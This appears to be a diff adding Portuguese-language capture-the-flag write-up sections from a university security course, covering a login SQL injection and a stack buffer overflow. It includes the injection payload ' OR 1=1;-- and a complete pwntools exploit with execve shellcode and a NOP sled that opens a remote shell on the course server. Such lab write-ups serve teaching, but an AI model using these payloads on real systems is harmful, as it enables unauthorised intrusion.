@@ -251,8 +251,101 @@ Como seria de esperar, conseguimos fazer login com a nova password - `1234`.
 
 ## Desafio 1
 
+O objetivo deste desafio é fazer login no site como "admin". Ao analisar o ficheiro `index.php`, que está a correr no servidor, conseguimos identificar a query utilizada para validar a existência na base de dados de um utilizador com as credenciais inseridas.
+
+```php
 (...)
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+               
+$query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
+
+(...)
+```
+
+Podemos perceber que as credenciais inseridas pelo utilizador, e que são enviadas no pedido, são concatenadas na string que representa a query, sem qualquer tipo de proteção, o que torna esta query vulnerável a uma SQL injection. Existem várias formas de explorar esta vulnerabilidade para conseguir fazer login como qualquer utilizador deste serviço ("admin" neste caso). No nosso caso, usamos a string `admin` como username e `' OR 1=1;--` como password. Desta forma, a condição do `WHERE` será sempre verdadeira.
+
+A query resultante seria:
+```sql
+SELECT username FROM user WHERE username = 'admin' AND password = '' OR 1=1; --'
+```
 
 ## Desafio 2
 
+Output do `checksec`:
+```
+Arch:     i386-32-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      PIE enabled
+RWX:      Has RWX segments
+```
+A única proteção no executável é PIE(Position Independent Executable). Atendendo a isto, percebemos que é possível realizar um ataque `buffer overflow`
+
+Ao analisar o ficheiro `main.c` encontramos a vulnerabilidade que nos permite realizar esse ataque.
+```c
+char buffer[100];
+
 (...)
+
+gets(buffer);
+```
+A função `gets` lê caracteres do standard input, até encontrar uma nova linha ou um `EOF`, sem limite ao número de caracteres, o que neste caso nos permite escrever além dos 100 bytes reservados para `buffer`. O programa também dá output ao endereço de `buffer` a cada execução, pelo que podemos usá-lo para calcular o return address.
+
+O script que usamos abre uma conexão ao servidor, faz parsing da mensagem recebida para obter o endereço e cria um payload com shellcode de modo a abrir uma shell remotamente. Com a shell criada, fazemos `cat flag.txt` para obter o valor da flag.
+
+exploit.py
+```python
+import sys, socket
+from pwn import remote, process
+
+# 32bit shellcode
+shellcode = (
+  '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f'
+  '\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31'
+  '\xd2\x31\xc0\xb0\x0b\xcd\x80'
+).encode('latin-1')
+
+def exploit(hostname, port):
+    r = remote(hostname, port)
+    # r = process('./program')
+
+    data = r.recv(1024).decode('utf-8')
+
+    # Get second line
+    l = data.split('\n')[1]
+
+    # Get buffer address as an integer
+    index = l.index('0x')
+    addr = int(l[index:index+10], 16)
+
+    # Return Address = Buffer Address + Buffer Size + Frame Pointer Size + Offset
+    ret = addr + 100 + 4 + 50
+
+    # Fill the payload with NOP's
+    payload = bytearray(0x90 for i in range(400)) 
+
+    # Place shellcode at the very end of the payload
+    start = 400 - len(shellcode)
+    payload[start:start + len(shellcode)] = shellcode
+
+    # Buffer size is 100 bytes
+    # +4 (probably because of alignment)
+    # +4 because return address comes after the frame pointer ($ebp)
+    offset = 100 + 4 + 4
+
+    L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+    payload[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
+
+    r.send(payload)
+    r.interactive()
+
+hostname = 'ctf-fsi.fe.up.pt'
+port = 4001
+
+exploit(hostname, port)
+```
+
+
